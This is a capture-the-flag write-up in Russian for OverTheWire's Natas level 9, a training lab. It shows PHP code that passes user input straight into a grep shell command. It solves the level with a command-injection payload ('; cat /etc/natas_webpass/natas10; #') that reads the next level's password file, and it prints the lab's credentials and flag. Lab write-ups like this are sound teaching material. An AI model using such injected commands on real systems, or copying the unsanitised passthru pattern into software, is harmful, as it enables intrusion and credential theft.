# NATAS_9 WriteUp
:computer: Host: http://natas9.natas.labs.overthewire.org/  
:bust_in_silhouette: Usename: natas9  
:key: Password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

:triangular_flag_on_post: Flag: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

- [NATAS\_9 WriteUp](#natas_9-writeup)
  - [Обзор веб-приложения](#обзор-веб-приложения)
  - [Решение](#решение)

## Обзор веб-приложения
<a name="Обзор_веб-приложения"></a> 
Веб-приложение выглядит следующим образом
![Скриншот веб-приложения](./img/natas9/natas9_0.png)

Ввод слова ``test`` привёл к вот такой реакции  
![Скриншот веб-приложения](./img/natas9/natas9_1.png)

Кнопка <kbd>**View sourcecode**</kbd> позволяет просмотреть исходный код страницы
```php
// HTML Code ...
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
// HTML Code ...
```
## Решение
<a name="Решение"></a>
В исходном коде веб-приложения видим команду, которая выполняет поиск по вводимому пользователем слову  
```php
passthru("grep -i $key dictionary.txt");
```

Выводим флаг от этой лабораторки при помощи уязвимости Command Injection  
:space_invader: Payload: ``; cat /etc/natas_webpass/natas10; # ``  

![Получение флага](img/natas9/natas9_4.png)

Полученный флаг: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
